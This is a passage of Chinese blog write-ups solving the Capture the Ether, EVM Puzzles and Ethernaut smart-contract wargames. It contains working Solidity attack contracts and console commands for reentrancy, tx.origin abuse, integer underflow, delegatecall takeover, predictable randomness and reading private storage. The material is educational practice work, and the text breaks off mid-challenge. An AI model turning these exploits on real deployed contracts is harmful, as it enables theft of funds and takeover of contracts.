[{"id":"0e030f53c4fb86d5302f4b7a9265440a","title":"Capture the Ether靶场","content":"由于Ropsten测试网被弃用了，就在本地测试\r\nWarmup\r\nDeploy a contract\r\n\r\n把代码扔remix上部署一下就行了\r\nCall me\r\n\r\n先调用callme()函数，就能通过\r\nChoose a nickname\r\n\r\n在这里随意传入一个bytes32的字符串就ok\r\nLotteries\r\nGuess the number\r\n\r\n首先给这个合约1个ETH，需要用1个ETH猜测42,即可调用transfer清空余额\r\nGuess the secret number\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.4.21;\r\n\r\ncontract GuessTheSecretNumberChallenge {\r\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\r\n\r\n    function GuessTheSecretNumberChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n    \r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function guess(uint8 n) public payable {\r\n        require(msg.value == 1 ether);\r\n\r\n        if (keccak256(n) == answerHash) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}\r\n攻击合约\r\ncontract guessit{\r\n    GuessTheSecretNumberChallenge add;\r\n    function guessit(address _addr) public payable{\r\n        add=GuessTheSecretNumberChallenge(_addr);\r\n    }\r\n    uint8 public n;\r\n\r\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\r\n    function get(){\r\n    for(uint8 i=0;i&lt;256;i++){\r\n        if(keccak256(i)==answerHash)\r\n        {\r\n            n=i;\r\n            break;\r\n        }\r\n    }\r\n    }   \r\n//        function gueess() external payable{\r\n//        add.guess(n);\r\n//    }     //为什么这边调用会失败？\r\n}\r\n\r\nuint8数字不大，暴力破解\r\n通过for循环找出那个n，直接用guess方法\r\n\r\n但是用攻击合约来调用原合约的guess方法报错？\r\n\r\nGuess the randon number\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.4.21;\r\n\r\ncontract GuessTheRandomNumberChallenge {\r\n    uint8 answer;\r\n\r\n    function GuessTheRandomNumberChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n        answer = uint8(keccak256(block.blockhash(block.number - 1), now));\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function guess(uint8 n) public payable {\r\n        require(msg.value == 1 ether);\r\n\r\n        if (n == answer) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}\r\n\r\nGuess the new number\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.4.21;\r\n\r\ncontract GuessTheNewNumberChallenge {\r\n    function GuessTheNewNumberChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function guess(uint8 n) public payable {\r\n        require(msg.value == 1 ether);\r\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\r\n\r\n        if (n == answer) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}\r\n攻击代码\r\ncontract guessit{\r\n    GuessTheNewNumberChallenge add;\r\n    function guessit(address _addr) public payable{\r\n    add=GuessTheNewNumberChallenge(_addr);\r\n    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\r\n    add.guess.value(1 ether)(answer);\r\n\r\n    }\r\n}\r\n\r\n","slug":"Capture the Ether靶场","date":"2023-03-24T15:33:01.000Z","categories_index":"","tags_index":"solidity靶场","author_index":"cocoZ"},{"id":"22c49c6ffbea3c60b8a9bf177b3b8838","title":"EVM Puzzles题解","content":"配置环境\r\ngit clone https://github.com/fvictorio/evm-puzzles.git\r\ncd evm-puzzles\r\nnpm install\r\nnpx hardhat play\r\n输入这两行代码开始做题\r\ncd evm-puzzles\r\nnpx hardhat play\r\nEVM.codes\r\nhttps://www.evm.codes/?fork=merge\r\n使用EVM.codes调试题目\r\n\r\nGitHub的仓库网址在https://github.com/fvictorio/evm-puzzles\r\n\r\n\r\nPuzzle 1\r\n00      34      CALLVALUE\r\n01      56      JUMP\r\n02      FD      REVERT\r\n03      FD      REVERT\r\n04      FD      REVERT\r\n05      FD      REVERT\r\n06      FD      REVERT\r\n07      FD      REVERT\r\n08      5B      JUMPDEST\r\n09      00      STOP\r\nCALLVALUE将 msg.value 压入堆栈\r\n我们要跳转到的 PC\r\n必须是一个由JUMPDEST操作码标记的有效目的地\r\n之后，JUMP将从堆栈中弹出顶部元素，即\r\nmsg.value。这相当于调用jump(msg.value). 它将 PC\r\n更改为我们输入指定的地址。\r\n目标是跳转到 address 0x08，所以 8 是正确的输入。\r\nPuzzle 2\r\n############\r\n# Puzzle 2 #\r\n############\r\n\r\n00      34      CALLVALUE\r\n01      38      CODESIZE\r\n02      03      SUB\r\n03      56      JUMP\r\n04      FD      REVERT\r\n05      FD      REVERT\r\n06      5B      JUMPDEST\r\n07      00      STOP\r\n08      FD      REVERT\r\n09      FD      REVERT\r\nSUB：\r\n\r\n压栈的顺序从00--&gt;09\r\n这里的CODESIZE=10\r\n先将CALLVALUE压栈再将CODESIZE压栈\r\nCODESIZE在上，CALLVALUE在下\r\n所以要求CODESIZE-CALLVALUE=6\r\n因此正确输入是4\r\nPuzzle 3\r\n############\r\n# Puzzle 3 #\r\n############\r\n\r\n00      36      CALLDATASIZE\r\n01      56      JUMP\r\n02      FD      REVERT\r\n03      FD      REVERT\r\n04      5B      JUMPDEST\r\n05      00      STOP\r\nCALLDATASIZE可以获取当前输入的数值的大小\r\n我们需要跳转到0x04，就需要输入一个四字节的数据:0xFFFFFFFF\r\nPuzzle 4\r\n############\r\n# Puzzle 4 #\r\n############\r\n\r\n00      34      CALLVALUE\r\n01      38      CODESIZE\r\n02      18      XOR\r\n03      56      JUMP\r\n04      FD      REVERT\r\n05      FD      REVERT\r\n06      FD      REVERT\r\n07      FD      REVERT\r\n08      FD      REVERT\r\n09      FD      REVERT\r\n0A      5B      JUMPDEST\r\n0B      00      STOP\r\nXOR按位异或\r\n\r\nCODESIZE=12\r\n题目需要XOR(CALLVALUE,CODESIZE)=0x0A，即XOR(msg.value,12)=0x0A\r\nXOR(二进制0/1，相同为0，不同为1)\r\n12--&gt;1100\r\n0x0A(16进制)--&gt;10(10进制)--&gt;1010\r\n得到0110 XOR 1100 = 1010\r\n0110 --&gt; 6\r\n所以正确答案是6\r\n\r\n还有一种方法：XOR(msg.value,12)=0x0A\r\n也就是XOR(0x0A,12)=msg.value\r\n可以用c语言来计算\r\n\r\n\r\nPuzzle 5\r\n############\r\n# Puzzle 5 #\r\n############\r\n\r\n00      34          CALLVALUE\r\n01      80          DUP1\r\n02      02          MUL\r\n03      610100      PUSH2 0100\r\n06      14          EQ\r\n07      600C        PUSH1 0C\r\n09      57          JUMPI\r\n0A      FD          REVERT\r\n0B      FD          REVERT\r\n0C      5B          JUMPDEST\r\n0D      00          STOP\r\n0E      FD          REVERT\r\n0F      FD          REVERT\r\nCALLVALUE被执行\r\n| 堆叠位置 | 堆栈值 | \r\n| -------------- | -------------- | \r\n| #0 | × |\r\nDUP1被执行（复制栈中的第一个值并将其压入栈的第一个位置）\r\n| 堆叠位置 | 堆栈值 | \r\n| -------------- | -------------- | \r\n| #0 | × | \r\n| #1 | × |\r\nMUL被执行（弹出堆栈的前两个值并将它们相乘。结果被压回栈）\r\n| 堆叠位置 | 堆栈值 | \r\n| -------------- | -------------- | \r\n| #0 | X * X |\r\nPUSH2 0100被执行\r\n| 堆叠位置 | 堆栈值 | \r\n| -------------- | -------------- | \r\n| #0 | 0x0100 | \r\n| #1 | X * X |\r\nEQ被执行（从堆栈中弹出 2 个值，如果它们相等，则将 1\r\n压入堆栈，否则压入 0。）\r\n| 堆叠位置 | 堆栈值 | \r\n| -------------- | -------------- | \r\n| #0 | 1 如果 X*X === 0x0100 |\r\nPUSH 0C被执行\r\n| 堆叠位置 | 堆栈值 | \r\n| -------------- | -------------- | \r\n| #0 | 0x0C | \r\n| #1 | 1 如果 X*X === 0x0100 |\r\n只有当等于时，EVM才会跳转到位置0x0c\r\n十六进制数0x0100表示十进制中的256\r\nmsg.value=x=sqrt(256)=16\r\n所以正确答案是16\r\nPuzzle 6\r\n############\r\n# Puzzle 6 #\r\n############\r\n\r\n00      6000      PUSH1 00\r\n02      35        CALLDATALOAD\r\n03      56        JUMP\r\n04      FD        REVERT\r\n05      FD        REVERT\r\n06      FD        REVERT\r\n07      FD        REVERT\r\n08      FD        REVERT\r\n09      FD        REVERT\r\n0A      5B        JUMPDEST\r\n0B      00        STOP\r\n\r\nPUSH1 00偏移量0 bytes\r\n最后要到0x0A，用0填充32字节\r\n所以答案为：0x000000000000000000000000000000000000000000000000000000000000000A\r\n","slug":"EVM Puzzles题解","date":"2023-03-24T15:32:03.000Z","categories_index":"","tags_index":"EVM","author_index":"cocoZ"},{"id":"baf051e8c20586e4bdafd3f442f3dba1","title":"Ethernaut题解","content":"Ethernaut\r\n1.Hello\r\n建立MetaMask账号连接一下\r\n按F12打开浏览器的控制台，输入help()\r\n\r\n使用命令getBalance(player)查询账户余额，显示pending，可以展开看（或者使用await getBalance(player)）\r\n\r\nethernaut合约\r\n在控制台输入ethernaut\r\n和ABI互动\r\nethernaut 是一个 TruffleContract 对象，\r\n它包装了部署在区块链上的 Ethernaut.sol 合约.\r\n除此之外，合约的 ABI 还提供了所有的 Ethernaut.sol\r\n公开方法, 比如 owner.\r\nethernaut.owner()或者await ethernaut.owner()\r\nawait contract.info()\r\n不断互动\r\nawait contract.info()\r\n\"You will find what you need in info1().\"\r\n\r\nawait contract.info1()\r\n\"Try info2(), but with \"hello\" as a parameter.\"\r\n\r\nawait contract.info2(\"hello\")\r\n\"The property infoNum holds the number of the next info method to call.\"\r\n\r\nawait contract.infoNum()\r\n42\r\n\r\nawait contract.info42()\r\n\"theMethodName is the name of the next method.\"\r\n\r\nawait contract.theMethodName()\r\n\"The method name is method7123949.\"\r\n\r\nawait contract.method7123949()\r\n\"If you know the password, submit it to authenticate().\"\r\n\r\nawait contract.password()\r\n\"ethernaut0\"\r\n\r\nawait contract.authenticate(\"ethernaut0\")\r\n2.Fallback\r\n首先查询合约地址的余额和地址\r\n\r\n调用contribute()函数转入1wei\r\n\r\n再次查询余额\r\n\r\n要将合约的所有者变成自己，需要调用receive()\r\n调用合约不存在的函数就可以触发（或者说转账）\r\n触发函数，地址发生改变\r\n\r\n将所有的钱取出提交即可\r\n\r\n3.Fallout\r\n乍一看看不懂，其实拿到合约的权限很简单（可以放在Remix上测试一下）\r\nfunction Fal1out() public payable {\r\n    owner = msg.sender;\r\n    allocations[owner] = msg.value;\r\n  }\r\n只需要调用构造函数Fallout()\r\n\r\n4.Coin Flip\r\n先贴上源代码和攻击合约\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract CoinFlip {\r\n\r\n  uint256 public consecutiveWins;\r\n  uint256 lastHash;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor() {\r\n    consecutiveWins = 0;\r\n  }\r\n\r\n  function flip(bool _guess) public returns (bool) {\r\n    uint256 blockValue = uint256(blockhash(block.number - 1));\r\n\r\n    if (lastHash == blockValue) {\r\n      revert();\r\n    }\r\n\r\n    lastHash = blockValue;\r\n    uint256 coinFlip = blockValue / FACTOR;\r\n    bool side = coinFlip == 1 ? true : false;\r\n\r\n    if (side == _guess) {\r\n      consecutiveWins++;\r\n      return true;\r\n    } else {\r\n      consecutiveWins = 0;\r\n      return false;\r\n    }\r\n  }\r\n}\r\n\r\ncontract exploit {\r\n  CoinFlip expFlip;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor(address aimAddr) {\r\n    expFlip = CoinFlip(aimAddr);\r\n  }\r\n\r\n  function hack() public {\r\n    uint256 blockValue = uint256(blockhash(block.number-1));\r\n    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);\r\n    bool guess = coinFlip == 1 ? true : false;\r\n    expFlip.flip(guess);\r\n  }\r\n}\r\n读合约，合约将抛硬币的正反抽象成产生新的区块的哈希值/FACTOR的值是否等于1（这个做除法的过程就是取整，其实就是判断产生新区块的哈希值与FACTOR的大小关系）\r\n\r\nFACTOR=2^255\r\n分析一下源代码里面的revert()\r\n判断lastHash==blockValue，如果没有这个判断，直接执行下面的语句lastHash=blockValue，会出现下一个区块还没产生，直接赋值，导致所有的区块的哈希值都一样的情况\r\n攻击合约的代码是产生区块后，根据算出来的结果进行猜测来操作的\r\n在remix上部署攻击合约，填入实例的地址，部署上链，进行hack()攻击\r\n\r\nTip：写攻击合约的两种方式\r\n\r\n要将要攻击的合约的源码赋在上面，创建一个CoinFlip类，给他地址（就是上面那个源码）\r\n使用接口interface，加入抽象函数\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface CoinFlip{\r\n  function flip(bool _guess) external returns (bool);\r\n}\r\n\r\ncontract exploit {\r\n  CoinFlip expFlip;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor(address aimAddr) {\r\n    expFlip = CoinFlip(aimAddr);\r\n  }\r\n\r\n  function hack() public {\r\n    uint256 blockValue = uint256(blockhash(block.number-1));\r\n    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);\r\n    bool guess = coinFlip == 1 ? true : false;\r\n    expFlip.flip(guess);\r\n  }\r\n}\r\n5.Telephone\r\n贴个源码\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Telephone {\r\n\r\n  address public owner;\r\n\r\n  constructor() {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  function changeOwner(address _owner) public {\r\n    if (tx.origin != msg.sender) {\r\n      owner = _owner;\r\n    }\r\n  }\r\n}\r\n首先是关于这个tx.origin\r\n\r\n分析源码要获得合约，需要调用changeOwner()函数，要满足条件tx.origin!=msg.sender，需要另外写一个合约来调用这个函数，这时tx.origin是受害者合约的msg.sender；而条件中的msg.sender是部署攻击合约的msg.sender\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Telephone {\r\n\r\n  address public owner;\r\n\r\n  constructor() {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  function changeOwner(address _owner) public {\r\n    if (tx.origin != msg.sender) {\r\n      owner = _owner;\r\n    }\r\n  }\r\n}\r\n\r\ncontract call{\r\n    Telephone mytele;\r\n\r\n    constructor(address aim){\r\n        mytele=Telephone(aim);\r\n    }\r\n\r\n    function attack() public{\r\n        mytele.changeOwner(msg.sender);\r\n    }\r\n}\r\n\r\n\r\n6.Token\r\n贴源码\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.0;\r\n\r\ncontract Token {\r\n\r\n  mapping(address =&gt; uint) balances;\r\n  uint public totalSupply;\r\n\r\n  constructor(uint _initialSupply) public {\r\n    balances[msg.sender] = totalSupply = _initialSupply;\r\n  }\r\n\r\n  function transfer(address _to, uint _value) public returns (bool) {\r\n    require(balances[msg.sender] - _value &gt;= 0);\r\n    balances[msg.sender] -= _value;\r\n    balances[_to] += _value;\r\n    return true;\r\n  }\r\n\r\n  function balanceOf(address _owner) public view returns (uint balance) {\r\n    return balances[_owner];\r\n  }\r\n}\r\n看一眼，感觉就是整数溢出的题目（刚开始跟着教程搞了半天没整出来，发现是教程有问题），可以构造balances[msg.sender] - _value发生下溢让其&gt;=0来实现\r\n查自己的余额：await contract.balanceOf(player)\r\n转账发生下溢：await contract.transfer('0xd212B8E81bB00838ceDeE960d778F316dC334eee',21)\r\nTip：注意！！！要转给其他用户地址！！！其他用户地址要用单引号'括起来！！！\r\n\r\n7.Delegation（多想想）\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Delegate {\r\n\r\n  address public owner;\r\n\r\n  constructor(address _owner) {\r\n    owner = _owner;\r\n  }\r\n\r\n  function pwn() public {\r\n    owner = msg.sender;\r\n  }\r\n}\r\n\r\ncontract Delegation {\r\n\r\n  address public owner;\r\n  Delegate delegate;\r\n\r\n  constructor(address _delegateAddress) {\r\n    delegate = Delegate(_delegateAddress);\r\n    owner = msg.sender;\r\n  }\r\n\r\n  fallback() external {\r\n    (bool result,) = address(delegate).delegatecall(msg.data);\r\n    if (result) {\r\n      this;\r\n    }\r\n  }\r\n}\r\n在合约Delegate中，pwn()函数改变owner\r\n而合约Delegation的回退函数调用时，delegatecall将msg.data转发给delegate合约，然后将delegatecall的返回值存入result变量，再继续执行合约代码\r\n题解：\r\nvar hold = web3.utils.keccak256(\"pwn()\")\r\ncontract.sendTransaction({data:hold})\r\n8.Force\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Force {/*\r\n\r\n                   MEOW ?\r\n         /\\_/\\   /\r\n    ____/ o o \\\r\n  /~____  =ø= /\r\n (______)__m_m)\r\n\r\n*/}\r\n分析：一个空合约，如何使其余额&gt;0 ？？？\r\n可以写一个合约，给其一定的余额，然后利用selfdestruct方法把钱转到空合约里面\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract deleteContract{\r\n    constructor() payable{}\r\n\r\n    function deleteIt(address _addr) external payable{\r\n        selfdestruct(payable(_addr));\r\n    }\r\n\r\n    function getBalance() external view returns(uint balance){\r\n        balance=address(this).balance;\r\n    }\r\n}\r\n\r\nTip:构造函数为payable，部署时给合约部署1Wei的余额，自毁时，把钱转入空合约中（也就是这个Instance\r\naddress里面）\r\n\r\n9.Vault\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Vault {\r\n  bool public locked;\r\n  bytes32 private password;\r\n\r\n  constructor(bytes32 _password) {\r\n    locked = true;\r\n    password = _password;\r\n  }\r\n\r\n  function unlock(bytes32 _password) public {\r\n    if (password == _password) {\r\n      locked = false;\r\n    }\r\n  }\r\n}\r\n\r\n关于状态变量在存储中的布局：\r\n每个存储槽将使用32个字节（一个字大小）；\r\n对于每个变量来说，会根据其类型确定以字节为单位的大小；\r\n如果可能的话，少于32字节的多个连续字段将根据以下规则被装入一个存储槽；\r\n一个存储槽中的第一个项目以低位对齐的方式存储。\r\n值类型只使用存储它们所需的字节数。\r\n如果一个值类型在一个存储槽的剩余部分放不下，它将被存储在下一个存储槽。\r\n结构和数组数据总是从一个新的存储槽开始，它们的项目根据这些规则被紧密地打包。\r\n结构或数组数据后面的项目总是开始一个新的存储槽。\r\n\r\n\r\npassword在slot1（查看方法写在后面第13题）\r\n使用getStorageAt获取：\r\nawait web3.eth.getStorageAt(\"0x578546AB0b765818E84ac03aaBa9eA942a9480B5\",1)\r\n\r\n提交即可\r\n10.King\r\n题目要求：成为合约的king，并且永远不被别人取代\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract King {\r\n\r\n  address king;\r\n  uint public prize;\r\n  address public owner;\r\n\r\n  constructor() payable {\r\n    owner = msg.sender;  \r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  receive() external payable {\r\n    require(msg.value &gt;= prize || msg.sender == owner);\r\n    payable(king).transfer(msg.value);\r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  function _king() public view returns (address) {\r\n    return king;\r\n  }\r\n}\r\n查询该地址余额为0.001ETH，需要转入更多的钱成为king，并且不被别人取代\r\n需要在构造攻击合约的fallback函数中加个revert()，不接受转账，永远成为king\r\n攻击合约：\r\ncontract attack{\r\n    constructor() payable{}\r\n    function callETH(address payable _to, uint256 amount) external payable{\r\n    // 处理下call的返回值，如果失败，revert交易并发送error\r\n    (bool success,) = _to.call{value: amount}(\"\");\r\n        require(success, \"Transfer failed.\");\r\n    }\r\n\r\n    fallback()external payable{\r\n        revert();\r\n    }\r\n}\r\n\r\n11.Re-entrancy\r\n重入攻击\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.12;\r\n\r\nimport './SafeMath.sol';\r\n\r\ncontract Reentrance {\r\n  \r\n  using SafeMath for uint256;\r\n  mapping(address =&gt; uint) public balances;\r\n\r\n  function donate(address _to) public payable {\r\n    balances[_to] = balances[_to].add(msg.value);\r\n  }\r\n\r\n  function balanceOf(address _who) public view returns (uint balance) {\r\n    return balances[_who];\r\n  }\r\n\r\n  function withdraw(uint _amount) public {\r\n    if(balances[msg.sender] &gt;= _amount) {\r\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\r\n      if(result) {\r\n        _amount;\r\n      }\r\n      balances[msg.sender] -= _amount;\r\n    }\r\n  }\r\n\r\n  receive() external payable {}\r\n}\r\n有点小问题就是题目给我的safemath库没有，就去openzepplin找了一个safemath库拷到本地，由于新版本，所以还要再修改一下\r\n// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)\r\n\r\npragma solidity ^0.6.12;\r\n\r\n// CAUTION\r\n// This version of SafeMath should only be used with Solidity 0.8 or later,\r\n// because it relies on the compiler's built in overflow checks.\r\n\r\n/**\r\n * @dev Wrappers over Solidity's arithmetic operations.\r\n *\r\n * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\r\n * now has built in overflow checking.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        // unchecked \r\n        {\r\n            uint256 c = a + b;\r\n            if (c &lt; a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        // unchecked\r\n         {\r\n            if (b &gt; a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        // unchecked\r\n         {\r\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n            // benefit is lost if 'b' is also tested.\r\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        // unchecked\r\n         {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        // unchecked \r\n        {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {trySub}.\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        // unchecked \r\n        {\r\n            require(b &lt;= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        // unchecked \r\n        {\r\n            require(b &gt; 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting with custom message when dividing by zero.\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {tryMod}.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        // unchecked\r\n         {\r\n            require(b &gt; 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n写攻击合约\r\ncontract Attack{\r\n  Reentrance public aim;\r\n\r\n  constructor(address payable aimAddr) public payable{\r\n    aim=Reentrance(aimAddr);\r\n\r\n  }\r\n\r\n  fallback() external payable{\r\n      aim.withdraw(0.001 ether);\r\n  }\r\n\r\n  function attack() public payable{\r\n      aim.donate{value: 0.001 ether}(address(this));\r\n    aim.withdraw(0.001 ether);\r\n  }\r\n\r\n  function withdraw() internal{\r\n    aim.withdraw(attackamout);\r\n  }\r\n}\r\n\r\n12.Elevator\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface Building {\r\n  function isLastFloor(uint) external returns (bool);\r\n}\r\n\r\n\r\ncontract Elevator {\r\n  bool public top;\r\n  uint public floor;\r\n\r\n  function goTo(uint _floor) public {\r\n    Building building = Building(msg.sender);\r\n\r\n    if (! building.isLastFloor(_floor)) {\r\n      floor = _floor;\r\n      top = building.isLastFloor(floor);\r\n    }\r\n  }\r\n}\r\n题目要求使top为true，但是读题发现在goTo那个函数怎么也没办法实现\r\nBuilding building = Building(msg.sender);\r\n这里的msg.sender需要传入一个外部合约，可以自由编写恶意操控\r\ncontract Attack{\r\n   Elevator public build;\r\n   constructor(address aim){\r\n     build=Elevator(aim);\r\n   }\r\n\r\n  bool result = true;\r\n  function isLastFloor(uint) external returns (bool){\r\n    if(result==true){\r\n      result=false;\r\n    }\r\n    else{\r\n      result=true;\r\n    }\r\n    return result;\r\n  } \r\n\r\n  function attack() public {\r\n    build.goTo(10);\r\n  }\r\n}\r\n\r\n13.Privacy\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Privacy {\r\n\r\n  bool public locked = true;\r\n  uint256 public ID = block.timestamp;\r\n  uint8 private flattening = 10;\r\n  uint8 private denomination = 255;\r\n  uint16 private awkwardness = uint16(block.timestamp);\r\n  bytes32[3] private data;\r\n\r\n  constructor(bytes32[3] memory _data) {\r\n    data = _data;\r\n  }\r\n  \r\n  function unlock(bytes16 _key) public {\r\n    require(_key == bytes16(data[2]));\r\n    locked = false;\r\n  }\r\n\r\n  /*\r\n    A bunch of super advanced solidity algorithms...\r\n\r\n      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`\r\n      